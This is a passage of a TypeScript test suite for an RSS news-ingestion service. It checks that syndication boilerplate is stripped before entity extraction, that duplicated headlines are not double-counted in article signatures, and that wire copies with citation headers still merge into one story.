    // The same class as the metadata blob, at the other end of the text: a link
    // to the rest of the article, a syndication credit, a newsletter promotion.
    // `Continue reading…` named an Entity called `Continue` on every item on two
    // Guardian feeds, and the Quanta credit repeats the Article's own headline
    // inside its body — so the headline was counted twice in the signature and
    // the story was signed as though it were about Quanta Magazine.
    const items = [
      {
        headline: 'Libyan unity talks upended as warlord’s son linked to drone attacks',
        body: 'The deputy commander has been seen by the US as an important figure. Continue reading...',
      },
      {
        headline: 'Sea Monkeys Show Scientists How To Rewrite a Rule of Turbulence',
        body: 'Energy does not flow in only one direction in a turbulent system. The post Sea Monkeys Show Scientists How To Rewrite a Rule of Turbulence first appeared on Quanta Magazine',
      },
      {
        headline: 'New York grapples with kinks in $1B Medicaid system',
        body: "The administration unveiled 12 districts where housing will be fast-tracked. Missed this morning’s New York Playbook? We forgive you. Read it here .",
      },
    ];
    const { service, articleRepo, source } = await buildService({
      fetcher: new XmlFeedFetcher(
        rssDocument(items, (_item, i) => `https://example.com/furniture-${i}`, publishedAt),
      ),
    });
    await service.ingestSource(source.id);

    for (let i = 0; i < items.length; i++) {
      const stored = await articleRepo.findByExternalId(source.id, `item-${i}`);
      expect(stored?.body, `item-${i}`).not.toMatch(/Continue reading/);
      expect(stored?.body, `item-${i}`).not.toMatch(/first appeared on/);
      expect(stored?.body, `item-${i}`).not.toMatch(/New York Playbook/);
      const names = (stored?.entities ?? []).map((e) => e.canonicalName);
      expect(names, `item-${i}`).not.toContain('Continue');
      expect(names, `item-${i}`).not.toContain('Quanta Magazine');
    }
  });

  it('counts an item headline once, not once for itself and again inside its body', async () => {
    // A feed that appends the Article's own headline to its body has its title in
    // the signature twice, so the headline weighs double against the prose — and
    // two Articles with different stories and a shared headline drift together.
    const items = [
      {
        headline: 'Sea Monkeys Rewrite a Rule of Turbulence',
        body: 'Energy does not flow in one direction in a turbulent system. The post Sea Monkeys Rewrite a Rule of Turbulence first appeared on Quanta Magazine',
      },
      {
        headline: 'A Different Story Entirely',
        body: 'The city council approved a budget on Tuesday after a long debate.',
      },
    ];
    const { service, articleRepo, source } = await buildService({
      fetcher: new XmlFeedFetcher(
        rssDocument(items, (_item, i) => `https://example.com/dupe-${i}`, publishedAt),
      ),
    });
    await service.ingestSource(source.id);

    const first = await articleRepo.findByExternalId(source.id, 'item-0');
    const headlineWords = (first?.title.toLowerCase().match(/[a-z]+/g) ?? []).filter(
      (w) => ['sea', 'monkeys', 'rewrite', 'rule', 'turbulence'].includes(w),
    );
    for (const word of headlineWords) {
      const occurrences = (first?.signature.words ?? []).filter((w) => w === word).length;
      // normalizeSignature dedupes, so a repeated headline word is one entry —
      // the point being that the body's copy of the title adds nothing at all.
      expect(occurrences, `"${word}" appears ${occurrences} times`).toBeLessThanOrEqual(1);
    }
  });

  it('still collapses a wire story when the feed wraps it in a citation header', async () => {
    // The point of the two rules above is not only that they separate. A Source
    // that copies another outlet's story behind its own header still has to
    // deduplicate, so the cut cannot cost a real match.
    const copy = WIRE_COPIES[0]!;
    const items = [0, 1, 2].map((i) => ({
      headline: WIRE_COPIES[i]!.headline,
      body: `Nature, Published online: 02 October 2026; doi:10.1038/d41586-026-0300${i} ${WIRE_COPIES[i]!.body}`,
    }));
    const { service, articleRepo, storyRepo, source } = await buildService({
      fetcher: new XmlFeedFetcher(
        rssDocument(items, (_item, i) => `https://www.nature.com/articles/wire-${i}`, publishedAt),
      ),
    });

    const report = await service.ingestSource(source.id);

    expect(report.merged).toBe(2);
    expect(report.storiesAffected).toBe(1);
    const storyIds = new Set<string>();
    for (let i = 0; i < items.length; i++) {
      const stored = await articleRepo.findByExternalId(source.id, `item-${i}`);
      if (stored?.storyId) storyIds.add(stored.storyId);
    }
    expect(storyIds.size).toBe(1);
    expect(
      (await storyRepo.getById([...storyIds][0] as never))?.articleCount,
    ).toBe(3);
    expect(copy.body.length).toBeGreaterThan(0);
  });
});
